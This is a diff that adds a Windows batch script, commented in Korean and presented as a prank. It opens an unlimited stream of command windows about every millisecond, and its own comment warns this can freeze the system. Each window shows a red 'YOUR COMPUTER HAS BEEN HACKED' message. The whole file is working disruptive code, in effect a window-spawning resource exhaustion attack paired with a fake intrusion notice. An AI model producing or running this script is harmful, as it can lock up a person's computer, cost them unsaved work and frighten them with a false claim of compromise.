@@ -1,0 +1,41 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: 몇 개 창 띄울지 (0 = 무제한)
+set "MAX_TOTAL=0"
+
+:: 창 생성 속도 (밀리초) → 너무 낮추면 시스템이 멈출 수 있음
+set "SPAWN_DELAY_MS=1"
+
+:: 자식 창 타이틀
+set "TITLE_PREFIX=PRANK_CMD_"
+
+if /I "%1"=="child" goto :child_mode
+
+set /a CNT=0
+:spawn_loop
+if "%MAX_TOTAL%" NEQ "0" if !CNT! GEQ %MAX_TOTAL% goto :done
+
+set /a CNT+=1
+start "" cmd /k "%~f0 child !CNT!"
+ping 127.0.0.1 -n 1 -w %SPAWN_DELAY_MS% > nul
+goto :spawn_loop
+
+:done
+echo Done spawning %CNT% windows.
+exit /b
+
+:child_mode
+set "IDX=%2"
+title %TITLE_PREFIX%%IDX%
+color 4F
+mode con: cols=50 lines=20
+cls
+
+echo.
+echo              YOUR COMPUTER HAS BEEN HACKED
+echo.
+
+:loop
+timeout /t 60 >nul
+goto :loop
